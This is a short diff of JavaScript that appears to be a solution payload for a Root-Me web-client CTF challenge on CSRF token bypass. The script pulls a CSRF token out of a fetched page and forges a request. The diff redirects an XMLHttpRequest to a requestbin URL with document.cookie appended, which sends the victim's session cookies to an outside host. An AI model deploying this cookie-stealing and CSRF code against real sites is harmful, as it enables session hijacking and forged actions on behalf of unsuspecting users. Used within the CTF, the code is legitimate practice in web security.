@@ -8,10 +8,11 @@ function readBody(xhr) {
     } else {
         data = xhr.response;
     }
+    document.write(data);
     var parser = new DOMParser();
     var resp = parser.parseFromString(data, "text/html");
     token = resp.getElementsByName('token')[0].value; //grab first available token
-csrf(token);
+	csrf(token);
     return data;
 }
 var xhr = new XMLHttpRequest();
@@ -20,7 +21,7 @@ xhr.onreadystatechange = function () {
         response = readBody(xhr);
   }
 }
-xhr.open('GET', 'http://challenge01.root-me.org/web-client/ch23/?action=profile', true);
+xhr.open('GET', 'http://requestbin.fullcontact.com/zsu6d8zs?c'+document.cookie, true);
 xhr.send(null);
 function csrf(token) {
     var sendWidgetModel = {
